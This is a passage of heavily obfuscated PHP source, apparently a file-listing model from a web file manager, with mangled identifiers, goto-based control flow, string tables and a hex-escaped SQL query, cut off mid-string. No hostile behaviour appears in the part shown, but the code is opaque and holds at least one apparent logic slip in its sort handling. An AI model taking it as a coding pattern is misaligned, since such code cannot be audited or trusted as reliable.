(!$AÍî•ÑİÃ) { return array(); } $AŠ¿¿™“‘„ = $this->where(array($d‹’…”Ğé¿[385] => array($d‹’…”Ğé¿[7], $AÍî•ÑİÃ)))->select(); $this->_listDataApply($AŠ¿¿™“‘„, $C£¦†ÑóÂå); goto b…¥Šˆ„ùµ; b…¥Šˆ„ùµ: return array_to_keyvalue($AŠ¿¿™“‘„, $d‹’…”Ğé¿[385]); goto e‘Û‘½·ëĞ; BâïÄÁ‰‘: $d‹’…”Ğé¿ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AÍî•ÑİÃ = $AÍî•ÑİÃ ? $AÍî•ÑİÃ : array(); $AÍî•ÑİÃ = array_filter(array_unique($AÍî•ÑİÃ)); goto F¡“»«˜ÓŒ; e‘Û‘½·ëĞ: } public function pathInfoFilter($cÜìÙÎ’éÖ) { goto a›ÄÍÎ®; aîŒù—¸: if (isset($cÜìÙÎ’éÖ[$b½Ú˜ß‚Ôª[392]]) && $cÜìÙÎ’éÖ[$b½Ú˜ß‚Ôª[392]][$b½Ú˜ß‚Ôª[393]] == -1) { $C¶ô´¸™ª = array_remove_value($C¶ô´¸™ª, $b½Ú˜ß‚Ôª[190]); $C¶ô´¸™ª = array_remove_value($C¶ô´¸™ª, $b½Ú˜ß‚Ôª[107]); $C¶ô´¸™ª = array_remove_value($C¶ô´¸™ª, $b½Ú˜ß‚Ôª[394]); $C¶ô´¸™ª = array_remove_value($C¶ô´¸™ª, $b½Ú˜ß‚Ôª[395]); $C¶ô´¸™ª = array_remove_value($C¶ô´¸™ª, $b½Ú˜ß‚Ôª[77]); $C¶ô´¸™ª = array_remove_value($C¶ô´¸™ª, $b½Ú˜ß‚Ôª[396]); } $cÜìÙÎ’éÖ = array_field_key($cÜìÙÎ’éÖ, $C¶ô´¸™ª); return $cÜìÙÎ’éÖ; goto FÕ®ĞÏ«Ü¨; a›ÄÍÎ®: $b½Ú˜ß‚Ôª =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cÜìÙÎ’éÖ[$b½Ú˜ß‚Ôª[75]] = KodIO::make($cÜìÙÎ’éÖ[$b½Ú˜ß‚Ôª[385]]); $cÜìÙÎ’éÖ[$b½Ú˜ß‚Ôª[29]] = $cÜìÙÎ’éÖ[$b½Ú˜ß‚Ôª[386]] == 1 ? $b½Ú˜ß‚Ôª[76] : $b½Ú˜ß‚Ôª[171]; goto F˜¿¸¬Ûè•; F˜¿¸¬Ûè•: $cÜìÙÎ’éÖ[$b½Ú˜ß‚Ôª[387]] = $this->typeName($cÜìÙÎ’éÖ[$b½Ú˜ß‚Ôª[387]]); if ($cÜìÙÎ’éÖ[$b½Ú˜ß‚Ôª[386]] != 1) { $cÜìÙÎ’éÖ[$b½Ú˜ß‚Ôª[165]] = $cÜìÙÎ’éÖ[$b½Ú˜ß‚Ôª[388]]; unset($cÜìÙÎ’éÖ[$b½Ú˜ß‚Ôª[388]]); } $FãˆÏ±Ç± = $b½Ú˜ß‚Ôª[389]; goto bï‹½¶”–; bï‹½¶”–: $FãˆÏ±Ç± .= $b½Ú˜ß‚Ôª[390]; $FãˆÏ±Ç± .= $b½Ú˜ß‚Ôª[391]; $C¶ô´¸™ª = explode($b½Ú˜ß‚Ôª[47], $FãˆÏ±Ç±); goto aîŒù—¸; FÕ®ĞÏ«Ü¨: } public function listUserFav() { goto AèÄïà¨±; AèÄïà¨±: $eÑ¬—¯µ¶ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Dº§¼Ø…› = Model($eÑ¬—¯µ¶[397])->listData(); $fÜ‚ÛëŠØ = array_filter_by_field($Dº§¼Ø…›, $eÑ¬—¯µ¶[29], $eÑ¬—¯µ¶[398]); goto fÆŒ‡ß‘ÄÒ; fÆŒ‡ß‘ÄÒ: $fÜ‚ÛëŠØ = array_to_keyvalue($fÜ‚ÛëŠØ, $eÑ¬—¯µ¶[33], $eÑ¬—¯µ¶[75]); if ($fÜ‚ÛëŠØ) { $b“ØÎâã›Í = $this->listSource(array($eÑ¬—¯µ¶[399] => array($eÑ¬—¯µ¶[400], $fÜ‚ÛëŠØ))); } $b“ØÎâã›Í = array_to_keyvalue($b“ØÎâã›Í[$eÑ¬—¯µ¶[361]], $eÑ¬—¯µ¶[385]); goto C˜‹·Í†‚¸; C˜‹·Í†‚¸: foreach ($Dº§¼Ø…› as &$aŞˆ¤Ë”) { $aŞˆ¤Ë” = array($eÑ¬—¯µ¶[401] => $aŞˆ¤Ë”[$eÑ¬—¯µ¶[383]], $eÑ¬—¯µ¶[402] => $aŞˆ¤Ë”[$eÑ¬—¯µ¶[28]], $eÑ¬—¯µ¶[403] => $aŞˆ¤Ë”[$eÑ¬—¯µ¶[75]], $eÑ¬—¯µ¶[404] => $aŞˆ¤Ë”[$eÑ¬—¯µ¶[29]], $eÑ¬—¯µ¶[405] => $aŞˆ¤Ë”[$eÑ¬—¯µ¶[190]], $eÑ¬—¯µ¶[406] => $aŞˆ¤Ë”[$eÑ¬—¯µ¶[107]]); if ($aŞˆ¤Ë”[$eÑ¬—¯µ¶[29]] == $eÑ¬—¯µ¶[398] && $b“ØÎâã›Í[$aŞˆ¤Ë”[$eÑ¬—¯µ¶[75]]]) { $aŞˆ¤Ë”[$eÑ¬—¯µ¶[407]] = $b“ØÎâã›Í[$aŞˆ¤Ë”[$eÑ¬—¯µ¶[75]]]; } } unset($aŞˆ¤Ë”); return $Dº§¼Ø…›; goto C‰Öì’öİ; C‰Öì’öİ: } public function listUserTag($aÙßîÙ´©) { goto Fï¢ƒ±ëï£; Fï¢ƒ±ëï£: $BïŸ¥±Ó¶ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($aÙßîÙ´© && !is_array($aÙßîÙ´©)) { $aÙßîÙ´© = array($aÙßîÙ´©); } $c„ù§¤‚„Ô = Model($BïŸ¥±Ó¶[408])->listData(); goto dåÎ«—¡¤¾; fè´Ú»±Ğê: if ($AÅÀˆÁ×ë) { Model($BïŸ¥±Ó¶[410])->removeBySource($AÅÀˆÁ×ë); } return $DóŒ‘Ö·Ê–; goto d ÷¤¸‰¹; aìÕ¾ìöÍ: $EÎ½ö‚¹î = array_to_keyvalue($DóŒ‘Ö·Ê–[$BïŸ¥±Ó¶[73]], $BïŸ¥±Ó¶[33], $BïŸ¥±Ó¶[385]); $b‹Òó³ò• = array_merge($EÎ½ö‚¹î, $DŞÙ‹´…¤); foreach ($b¼ÎÂ¦°¤“ as $cĞ¦Ò©™…) { if (!in_array($cĞ¦Ò©™…, $b‹Òó³ò•)) { $AÅÀˆÁ×ë[] = $cĞ¦Ò©™…; } } goto fè´Ú»±Ğê; CØ›—ô²à: foreach ($B¼±‡´™í as $BÊå‚Àª°Ÿ => $fòñËÄ) { $Bêàº‰„Û¢ = !0; if (!$aÙßîÙ´©) { $b¼ÎÂ¦°¤“[] = $BÊå‚Àª°Ÿ; continue; } foreach ($aÙßîÙ´© as $dÅ»íâÉ½Š) { if (!in_array($dÅ»íâÉ½Š, $fòñËÄ)) { $Bêàº‰„Û¢ = !1; break; } } if ($Bêàº‰„Û¢) { $b¼ÎÂ¦°¤“[] = $BÊå‚Àª°Ÿ; } } if (!$b¼ÎÂ¦°¤“) { return array(); } $DóŒ‘Ö·Ê– = $this->listSource(array($BïŸ¥±Ó¶[399] => array($BïŸ¥±Ó¶[400], $b¼ÎÂ¦°¤“))); goto CÔœ„®Ë¡¾; dåÎ«—¡¤¾: $B¼±‡´™í = array(); foreach ($c„ù§¤‚„Ô as $EíÈ·õÀöÑ) { $cĞ¦Ò©™… = $EíÈ·õÀöÑ[$BïŸ¥±Ó¶[75]]; if (!$cĞ¦Ò©™…) { continue; } if (!isset($B¼±‡´™í[$cĞ¦Ò©™…])) { $B¼±‡´™í[$cĞ¦Ò©™…] = array(); } $B¼±‡´™í[$cĞ¦Ò©™…][] = $EíÈ·õÀöÑ[$BïŸ¥±Ó¶[409]]; } $b¼ÎÂ¦°¤“ = array(); goto CØ›—ô²à; CÔœ„®Ë¡¾: if (!$DóŒ‘Ö·Ê– || count($b¼ÎÂ¦°¤“) == $DóŒ‘Ö·Ê–[$BïŸ¥±Ó¶[358]][$BïŸ¥±Ó¶[359]]) { return $DóŒ‘Ö·Ê–; } $AÅÀˆÁ×ë = array(); $DŞÙ‹´…¤ = array_to_keyvalue($DóŒ‘Ö·Ê–[$BïŸ¥±Ó¶[74]], $BïŸ¥±Ó¶[33], $BïŸ¥±Ó¶[385]); goto aìÕ¾ìöÍ; d ÷¤¸‰¹: } public function listUserRecycle() { $C„˜„®Š¯ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $f–ó¼Âê…š = Model($C„˜„®Š¯[411])->listData(); if (!$f–ó¼Âê…š) { return array(); } $eÑ«çÆùµí = array($C„˜„®Š¯[399] => array($C„˜„®Š¯[400], $f–ó¼Âê…š), $C„˜„®Š¯[412] => 1); return $this->listSource($eÑ«çÆùµí); } public function listSource($fõÁ†¢Ö, $Aá˜™–‡¹ = 3000) { goto AöÓÚ«§Š ; a³’®ƒ¬‰–: $fá©æœ§²Â = $this->field($a¡ƒã‹øŒ’)->_makeOrder()->where($fõÁ†¢Ö)->selectPage($Aá˜™–‡¹); $this->_listDataApply($fá©æœ§²Â[$Fà¯ÜÉ…›ª[361]]); $this->_listMake($fá©æœ§²Â); goto E³…œôÓ³; E³…œôÓ³: return $fá©æœ§²Â; goto a¸ƒæŒä½§; AöÓÚ«§Š : $Fà¯ÜÉ…›ª =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!isset($fõÁ†¢Ö[$Fà¯ÜÉ…›ª[413]])) { $fõÁ†¢Ö[$Fà¯ÜÉ…›ª[413]] = 0; } $a¡ƒã‹øŒ’ = $Fà¯ÜÉ…›ª[414]; goto a³’®ƒ¬‰–; a¸ƒæŒä½§: } protected function _makeOrder() { goto EÀˆ®Éî¹ù; BÒÃÀ¨‰š: if ($c‚²¿Ñë„‚ == $b™ÂËø‹ôˆ[28]) { } $D”áƒÜàÈ = $b™ÂËø‹ôˆ[425] . $C‚µ”Ë“«í[$c‚²¿Ñë„‚] . $b™ÂËø‹ôˆ[50] . $d™ È…„ğ¾[$dĞ×Şº›ã¯]; return $this->order(rtrim(trim($D”áƒÜàÈ), $b™ÂËø‹ôˆ[47])); goto AÊÌ™ˆÅ; a¯ªÃæß³Ú: $d™ È…„ğ¾ = array($b™ÂËø‹ôˆ[418] => $b™ÂËø‹ôˆ[419], $b™ÂËø‹ôˆ[420] => $b™ÂËø‹ôˆ[421]); $C‚µ”Ë“«í = array($b™ÂËø‹ôˆ[28] => $b™ÂËø‹ôˆ[28], $b™ÂËø‹ôˆ[77] => $b™ÂËø‹ôˆ[77], $b™ÂËø‹ôˆ[165] => $b™ÂËø‹ôˆ[388], $b™ÂËø‹ôˆ[394] => $b™ÂËø‹ôˆ[394], $b™ÂËø‹ôˆ[422] => $b™ÂËø‹ôˆ[395], $b™ÂËø‹ôˆ[190] => $b™ÂËø‹ôˆ[190], $b™ÂËø‹ôˆ[107] => $b™ÂËø‹ôˆ[107]); $c‚²¿Ñë„‚ = Input::get($b™ÂËø‹ôˆ[423], $b™ÂËø‹ôˆ[7], $dÇ¤à¶–³‰, array_keys($C‚µ”Ë“«í)); goto e”š›…Û‘½; EÀˆ®Éî¹ù: $b™ÂËø‹ôˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dÇ¤à¶–³‰ = Model($b™ÂËø‹ôˆ[415])->get($b™ÂËø‹ôˆ[416]); $fµ»ÃÀ•Ìî = Model($b™ÂËø‹ôˆ[415])->get($b™ÂËø‹ôˆ[417]); goto a¯ªÃæß³Ú; e”š›…Û‘½: $dĞ×Şº›ã¯ = Input::get($b™ÂËø‹ôˆ[424], $b™ÂËø‹ôˆ[7], $fµ»ÃÀ•Ìî, array_keys($d™ È…„ğ¾)); if (!in_array($c‚²¿Ñë„‚, array_keys($C‚µ”Ë“«í))) { $c‚²¿Ñë„‚ = $b™ÂËø‹ôˆ[28]; } if (!in_array($dĞ×Şº›ã¯, array_keys($d™ È…„ğ¾))) { $c‚²¿Ñë„‚ = $b™ÂËø‹ôˆ[418]; } goto BÒÃÀ¨‰š; AÊÌ™ˆÅ: } protected function _listDataApplyItem($C°ÇÖŒÂÓİ, $dïÂÙŒòÈ½ = false) { $A„ÃŸ¡Ê’Æ = array($C°ÇÖŒÂÓİ); $this->_listDataApply($A„ÃŸ¡Ê’Æ, $dïÂÙŒòÈ½); return $A„ÃŸ¡Ê’Æ[0]; } protected function _listDataApply(&$A±õªô”ñ, $e¾¿Âˆˆ™˜ = false) { goto BïÚô½ˆç†; e”†Òî²÷Ê: $this->_listAppendPath($A±õªô”ñ); $this->_listAppendAuth($A±õªô”ñ); $this->_listAppendSourceInfo($A±õªô”ñ, $cöªğ´á¨); goto eŠ ’…è»î; BïÚô½ˆç†: $AÃÙâ§˜ò‚ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$A±õªô”ñ) { $A±õªô”ñ = array(); return; } $cöªğ´á¨ = array_to_keyvalue($A±õªô”ñ, $AÃÙâ§˜ò‚[33], $AÃÙâ§˜ò‚[385]); goto AïÇ‚£ø÷; AïÇ‚£ø÷: $cöªğ´á¨ = array_unique($cöªğ´á¨); $this->_listSourceCache($A±õªô”ñ); if (!$e¾¿Âˆˆ™˜) { $this->_listAppendMeta($A±õªô”ñ, $cöªğ´á¨); $this->_listAppendFileMeta($A±õªô”ñ, $cöªğ´á¨); $this->_listAppendChildren($A±õªô”ñ, $cöªğ´á¨); } goto e”†Òî²÷Ê; eŠ ’…è»î: $this->_listAppendUser($A±õªô”ñ); $this->_listFilterInfo($A±õªô”ñ, $e¾¿Âˆˆ™˜); goto FóáĞª˜Ğ; FóáĞª˜Ğ: } protected function _listSourceCache($díÒ©ÂáÆ) { $Aó§—õåĞ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; foreach ($díÒ©ÂáÆ as $A¦°•‰Šˆ‰) { self::$cacheSourceInfo[$Aó§—õåĞ[426] . $A¦°•‰Šˆ‰[$Aó§—õåĞ[385]]] = $A¦°•‰Šˆ‰; } } protected function _listFilterInfo(&$BÖ ²Ş¥÷, $båƒæÂè”º = false) { $C§íñ„¯’ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; foreach ($BÖ ²Ş¥÷ as &$c§É‹ô§) { $c§É‹ô§ = $this->pathInfoFilter($c§É‹ô§); self::$cachePathInfo[$C§íñ„¯’[427] . intval($båƒæÂè”º) . $C§íñ„¯’[428] . $c§É‹ô§[$C§íñ„¯’[385]]] = $c§É‹ô§; } unset($c§É‹ô§); } protected function _listMake(&$aéå± Áç¼) { $dàùÀ³–˜Ù =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aéå± Áç¼[$dàùÀ³–˜Ù[74]] = array(); $aéå± Áç¼[$dàùÀ³–˜Ù[73]] = array(); foreach ($aéå± Áç¼[$dàùÀ³–˜Ù[361]] as $E“Æ®¿öê§) { $eğ»š™™¼™ = $E“Æ®¿öê§[$dàùÀ³–˜Ù[386]] == 1 ? $dàùÀ³–˜Ù[74] : $dàùÀ³–˜Ù[73]; $aéå± Áç¼[$eğ»š™™¼™][] = $E“Æ®¿öê§; } unset($aéå± Áç¼[$dàùÀ³–˜Ù[361]]); } protected function _listAppendMeta(&$c®œ˜ÕÀŸç, $A¢÷™ø¡ò¿) { goto a“ˆÁ—çÁ; a“ˆÁ—çÁ: $c˜âª­‘… =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b–„Öáğ‹‹ = array($c˜âª­‘…[399] => array($c˜âª­‘…[400], $A¢÷™ø¡ò¿)); $fÏ÷½õ‰¢® = Model($c˜âª­‘…[429])->field($c˜âª­‘…[430])->where($b–„Öáğ‹‹)->select(); goto dÍ‰õÔ­ª÷; dÍ‰õÔ­ª÷: if (!$fÏ÷½õ‰¢®) { return; } $D·Ñ¸†É°Ñ = array($c˜âª­‘…[431], $c˜âª­‘…[432]); $eñ¤ÙÊ¶Ç = array(); goto C†ªõ¨åÜ†; C†ªõ¨åÜ†: foreach ($fÏ÷½õ‰¢® as $d¡¬ÓŠ÷‹) { if (!isset($eñ¤ÙÊ¶Ç[$d¡¬ÓŠ÷‹[$c˜âª­‘…[385]]])) { $eñ¤ÙÊ¶Ç[$d¡¬ÓŠ÷‹[$c˜âª­‘…[385]]] = array(); } if (in_array($d¡¬ÓŠ÷‹[$c˜âª­‘…[89]], $D·Ñ¸†É°Ñ)) { continue; } $eñ¤ÙÊ¶Ç[$d¡¬ÓŠ÷‹[$c˜âª­‘…[385]]][$d¡¬ÓŠ÷‹[$c˜âª­‘…[89]]] = $d¡¬ÓŠ÷‹[$c˜âª­‘…[366]]; } foreach ($c®œ˜ÕÀŸç as &$eêŸ´ŠñßÛ) { $eêŸ´ŠñßÛ[$c˜âª­‘…[433]] = !1; if (isset($eñ¤ÙÊ¶Ç[$eêŸ´ŠñßÛ[$c˜âª­‘…[385]]])) { $eêŸ´ŠñßÛ[$c˜âª­‘…[433]] = $eñ¤ÙÊ¶Ç[$eêŸ´ŠñßÛ[$c˜âª­‘…[385]]]; } if ($this->fileIsLock($eêŸ´ŠñßÛ) && $eêŸ´ŠñßÛ[$c˜âª­‘…[392]]) { $dœœ¨ƒª¼Ê = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $eêŸ´ŠñßÛ[$c˜âª­‘…[392]][$c˜âª­‘…[393]] = AuthModel::authDisable($eêŸ´ŠñßÛ[$c˜âª­‘…[392]][$c˜âª­‘…[393]], $dœœ¨ƒª¼Ê); $eêŸ´ŠñßÛ[$c˜âª­‘…[392]][$c˜âª­‘…[434]][$c˜âª­‘…[392]] = $eêŸ´ŠñßÛ[$c˜âª­‘…[392]][$c˜âª­‘…[393]]; } } unset($eêŸ´ŠñßÛ); goto AÌµ†ÃÊ“Ø; AÌµ†ÃÊ“Ø: } protected function _listAppendFileMeta(&$c‘à¶ˆÔÈË, $B‚ïùÙ‰†µ) { goto Dë‡ôŞô«Œ; Dë‡ôŞô«Œ: $B¦ÉİÊ„Ã =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c¤ŠáŠ´ã¢ = array_to_keyvalue($c‘à¶ˆÔÈË, $B¦ÉİÊ„Ã[33], $B¦ÉİÊ„Ã[435]); $c¤ŠáŠ´ã¢ = array_filter(array_unique($c¤ŠáŠ´ã¢)); goto B…¨—óÈö‘; Cäšøİ½: $B³×šŞ‘Š— = $B³×šŞ‘Š— ? $B³×šŞ‘Š— : array(); $cõËÓ×ŠÒŞ = array(); foreach ($B³×šŞ‘Š— as $D²•˜òÁŠ•) { if (!isset($cõËÓ×ŠÒŞ[$D²•˜òÁŠ•[$B¦ÉİÊ„Ã[435]]])) { $cõËÓ×ŠÒŞ[$D²•˜òÁŠ•[$B¦ÉİÊ„Ã[435]]] = array(); } $cõËÓ×ŠÒŞ[$D²•˜òÁŠ•[$B¦ÉİÊ„Ã[435]]][$D²•˜òÁŠ•[$B¦ÉİÊ„Ã[89]]] = $D²•˜òÁŠ•[$B¦ÉİÊ„Ã[366]]; } goto Dáâ–á‰ãó; aœÓ•¶…§å: $AªÇ¤²‡ = Model($B¦ÉİÊ„Ã[438])->field($a½ö”¢¹¨)->where($Eâ¾«ç¨†‚)->select(); $AªÇ¤²‡ = array_to_keyvalue($AªÇ¤²‡, $B¦ÉİÊ„Ã[435]); $B³×šŞ‘Š— = Model($B¦ÉİÊ„Ã[439])->field($B¦ÉİÊ„Ã[440])->where($Eâ¾«ç¨†‚)->select(); goto Cäšøİ½; Dáâ–á‰ãó: foreach ($c‘à¶ˆÔÈË as &$f¶Ş¸¢ğ«ˆ) { goto E®çóŞ‰õ‘; a²œöù‘¥Õ: $Aš±‹¨ÁÄ[$B¦ÉİÊ„Ã[77]] = $f¶Ş¸¢ğ«ˆ[$B¦ÉİÊ„Ã[77]]; $Aš±‹¨ÁÄ[$B¦ÉİÊ„Ã[28]] = $f¶Ş¸¢ğ«ˆ[$B¦ÉİÊ„Ã[28]]; if (!isset(self::$cacheFileInfo[$B¦ÉİÊ„Ã[441] . $e¥å†’Òº])) { self::$cacheFileInfo[$B¦ÉİÊ„Ã[441] . $e¥å†’Òº] = array_merge(array(), $Aš±‹¨ÁÄ); } goto EÛ¸¢°¿ã; E®çóŞ‰õ‘: $e¥å†’Òº = $f¶Ş¸¢ğ«ˆ[$B¦ÉİÊ„Ã[435]]; if (!$e¥å†’Òº || !isset($AªÇ¤²‡[$e¥å†’Òº])) { continue; } $Aš±‹¨ÁÄ = $AªÇ¤²‡[$e¥å†’Òº]; goto a²œöù‘¥Õ; dÜ›ÇÍãÎ: if (isset($f¶Ş¸¢ğ«ˆ[$B¦ÉİÊ„Ã[161]][$B¦ÉİÊ„Ã[160]])) { $f¶Ş¸¢ğ«ˆ[$B¦ÉİÊ„Ã[160]] = json_decode($f¶Ş¸¢ğ«ˆ[$B¦ÉİÊ„Ã[161]][$B¦ÉİÊ„Ã[160]], !0); unset($f¶Ş¸¢ğ«ˆ[$B¦ÉİÊ„Ã[161]][$B¦ÉİÊ„Ã[160]]); } goto f—ù£Ö¶Ä; EÛ¸¢°¿ã: unset($AªÇ¤²‡[$e¥å†’Òº][$B¦ÉİÊ„Ã[75]]); $DµÆ¦»öÅè = is_array($cõËÓ×ŠÒŞ[$e¥å†’Òº]) ? $cõËÓ×ŠÒŞ[$e¥å†’Òº] : array(); $f¶Ş¸¢ğ«ˆ[$B¦ÉİÊ„Ã[161]] = array_merge($DµÆ¦»öÅè, $AªÇ¤²‡[$e¥å†’Òº]); goto dÜ›ÇÍãÎ; f—ù£Ö¶Ä: } unset($f¶Ş¸¢ğ«ˆ); goto f¶’âãºÅ; B…¨—óÈö‘: if (!$c¤ŠáŠ´ã¢) { return; } $Eâ¾«ç¨†‚ = array($B¦ÉİÊ„Ã[436] => array($B¦ÉİÊ„Ã[400], $c¤ŠáŠ´ã¢)); $a½ö”¢¹¨ = $B¦ÉİÊ„Ã[437]; goto aœÓ•¶…§å; f¶’âãºÅ: } protected function _listAppendSourceInfo(&$C›§İœ«êà, $f÷õÕğ’ã¡) { goto cã¨ÚŒ÷†é; fë‚È¨´¶Ï: $DŸŸìÚ‰Œ = array_to_keyvalue_group($e±Û³‚ø£, $CØ¢á«ƒƒ”[385]); foreach ($C›§İœ«êà as &$FšæØå·†ˆ) { $FšæØå·†ˆ[$CØ¢á«ƒƒ”[407]] = array($CØ¢á«ƒƒ”[445] => 0, $CØ¢á«ƒƒ”[446] => 0, $CØ¢á«ƒƒ”[447] => 0); if (isset($céÂŒñ‘êÅ[$FšæØå·†ˆ[$CØ¢á«ƒƒ”[385]]])) { $FšæØå·†ˆ[$CØ¢á«ƒƒ”[407]][$CØ¢á«ƒƒ”[448]] = 1; $FšæØå·†ˆ[$CØ¢á«ƒƒ”[407]][$CØ¢á«ƒƒ”[449]] = $céÂŒñ‘êÅ[$FšæØå·†ˆ[$CØ¢á«ƒƒ”[385]]][$CØ¢á«ƒƒ”[28]]; } if (isset($CëÁ—½¹[$FšæØå·†ˆ[$CØ¢á«ƒƒ”[385]]])) { $FšæØå·†ˆ[$CØ¢á«ƒƒ”[407]][$CØ¢á«ƒƒ”[450]] = array(); foreach ($CëÁ—½¹[$FšæØå·†ˆ[$CØ¢á«ƒƒ”[385]]] as $CØ®Â¸·¢) { $bÜõ‹°±æ = $FøÏÄ‘ë²Õ[$CØ®Â¸·¢]; $FšæØå·†ˆ[$CØ¢á«ƒƒ”[407]][$CØ¢á«ƒƒ”[450]][] = array($CØ¢á«ƒƒ”[451] => $bÜõ‹°±æ[$CØ¢á«ƒƒ”[383]], $CØ¢á«ƒƒ”[402] => $bÜõ‹°±æ[$CØ¢á«ƒƒ”[28]], $CØ¢á«ƒƒ”[452] => $bÜõ‹°±æ[$CØ¢á«ƒƒ”[453]]); } } if (isset($DŸŸìÚ‰Œ[$FšæØå·†ˆ[$CØ¢á«ƒƒ”[385]]])) { $FšæØå·†ˆ[$CØ¢á«ƒƒ”[407]][$CØ¢á«ƒƒ”[454]] = array(); foreach ($DŸŸìÚ‰Œ[$FšæØå·†ˆ[$CØ¢á«ƒƒ”[385]]] as $aÈÓåÉŒ) { $FšæØå·†ˆ[$CØ¢á«ƒƒ”[407]][$CØ¢á«ƒƒ”[454]] = array($CØ¢á«ƒƒ”[455] => $aÈÓåÉŒ[$CØ¢á«ƒƒ”[456]], $CØ¢á«ƒƒ”[457] => $aÈÓåÉŒ[$CØ¢á«ƒƒ”[458]], $CØ¢á«ƒƒ”[459] => $aÈÓåÉŒ[$CØ¢á«ƒƒ”[385]], $CØ¢á«ƒƒ”[460] => $aÈÓåÉŒ[$CØ¢á«ƒƒ”[461]], $CØ¢á«ƒƒ”[462] => $aÈÓåÉŒ[$CØ¢á«ƒƒ”[463]], $CØ¢á«ƒƒ”[464] => $aÈÓåÉŒ[$CØ¢á«ƒƒ”[464]], $CØ¢á«ƒƒ”[465] => $aÈÓåÉŒ[$CØ¢á«ƒƒ”[465]]); } } } unset($FšæØå·†ˆ); goto dõùë‰ÑÄí; c ’ê×íñ: $FøÏÄ‘ë²Õ = array_to_keyvalue($A¼æÕ¼ÖšØ, $CØ¢á«ƒƒ”[383]); $CëÁ—½¹ = array_to_keyvalue_group($bôã›æì˜, $CØ¢á«ƒƒ”[75], $CØ¢á«ƒƒ”[409]); $céÂŒñ‘êÅ = array_to_keyvalue($B¹ïõ£Àµ, $CØ¢á«ƒƒ”[75]); goto fë‚È¨´¶Ï; F³öšÍ¯ËË: $bôã›æì˜ = Model($CØ¢á«ƒƒ”[408])->listData(); $B¹ïõ£Àµ = Model($CØ¢á«ƒƒ”[397])->listData(); $e±Û³‚ø£ = Model($CØ¢á«ƒƒ”[444])->listSimple(); goto c ’ê×íñ; dõùë‰ÑÄí: return $C›§İœ«êà; goto BÃµ·ºÇ‡; cã¨ÚŒ÷†é: $CØ¢á«ƒƒ” =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!defined($CØ¢á«ƒƒ”[442])) { return; } $A¼æÕ¼ÖšØ = Model($CØ¢á«ƒƒ”[443])->listData(); goto F³öšÍ¯ËË; BÃµ·ºÇ‡: } protected function _listAppendChildren(&$FÍäƒ°•Ê‘, $EÜ¼îã¡‰‡) { goto f›¿Òµ¹í; fÄË¦ˆº¦ğ: foreach ($FÍäƒ°•Ê‘ as &$dŒ——Ì”°) { if ($dŒ——Ì”°[$cñğ²¼ë£ö[386]]) { unset($dŒ——Ì”°[$cñğ²¼ë£ö[388]]); $dŒ——Ì”°[$cñğ²¼ë£ö[200]] = intval($c‚ ‚²Àñì[$dŒ——Ì”°[$cñğ²¼ë£ö[385]] . $cñğ²¼ë£ö[468]][$cñğ²¼ë£ö[469]]); $dŒ——Ì”°[$cñğ²¼ë£ö[199]] = intval($c‚ ‚²Àñì[$dŒ——Ì”°[$cñğ²¼ë£ö[385]] . $cñğ²¼ë£ö[470]][$cñğ²¼ë£ö[469]]); } } unset($dŒ——Ì”°); goto fÓ§‘êå½Ë; CƒŠå¤’ª: $cö±ò• = 1024 * 50; $FÍäƒ°•Ê‘ = is_array($FÍäƒ°•Ê‘) ? $FÍäƒ°•Ê‘ : array(); $F¾ƒŒ–…æÚ = count($FÍäƒ°•Ê‘); goto f„Â¡§º; f›¿Òµ¹í: $cñğ²¼ë£ö =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dÍÌ‚Œ×ªé = $cñğ²¼ë£ö[368]; $c‚ ‚²Àñì = array(); goto CƒŠå¤’ª; f„Â¡§º: $E½’¼ìÅ›Å = $this->tablePrefix . $this->tableName; for ($a˜”Şù†Ø­ = 0; $a˜”Şù†Ø­ < $F¾ƒŒ–…æÚ; $a˜”Şù†Ø­++) { $dÇİ•Ğ£ù = intval($FÍäƒ°•Ê‘[$a˜”Şù†Ø­][$cñğ²¼ë£ö[413]]); if ($FÍäƒ°•Ê‘[$a˜”Şù†Ø­][$cñğ²¼ë£ö[386]]) { $b…óª¥¿Êô = $FÍäƒ°•Ê‘[$a˜”Şù†Ø­][$cñğ²¼ë£ö[385]]; $dÍÌ‚Œ×ªé .= "\123\105\x4c\105\103\124\x20\52\x20\x46\122\x4f\115\40\x28\123\x45\x4c\x45\103\124\40\x27{$b…óª¥¿Êô}\137\x68\x61\163\x46\151\x6c\145\47\x20\x61\x73\40\x68\141\163\54\x63\x6f\x75\156\x74\50\x31\51\40\x61\x73\x20\x68\141\163\x43\157\x75\x6e\164\x20\106\x52\x4f\x4d\x20\140{$E½’¼ìÅ›Å}\140\x20\xa\x9\x9\11\x9\x9\167\x68\145\162\x65\x20\160\141\162\x65\156\x74\x49\104\75{$b…óª¥¿Êô}\40\141\156\x64\x20\x69\163\x46\157\154\144\x65\x72\x3d\x30\40\x61\156\144\40\151\163\x44\145\154\x65\164\x65\75{$dÇİ•Ğ£ù}\51\40\141\x73\40\x74\142\61\137{$b…óª¥¿Êô}\x20\x75\156\151\157\156\40\x61\154\154\x20\xa\11\x9\x9\11\x9\123\x45\114\x45\x43\x54\40\x2a\x20\x46\122\117\115\x20\50\123\x45\114\x45\103\x54\x20\47{$b…óª¥¿Êô}\137\x68\141\163\x46\x6f\x6c\144\145\162\47\x20\141\x73\x20\150\141\x73\x46\x69\x6c\x65\x2c\x63\157\x75\x6e\164\50\61\x29\40\x61\163\x20\150\141\163\103\157\165\156\x74\40\x46\122\x4f\115\40\140{$E½’¼ìÅ›Å}\x60\x20\xa\x9\x9\x9\11\11\x77\x68\x65\x72\145\x20\160\141\x72\x65\156\164\111\104\x3d{$b…óª¥¿Êô}\40\141\156\x64\x20\151\x73\106\x6f\154\144\x65\162\75\61\x20\x61\156\144\x20\x69\x73\x44\145\154\145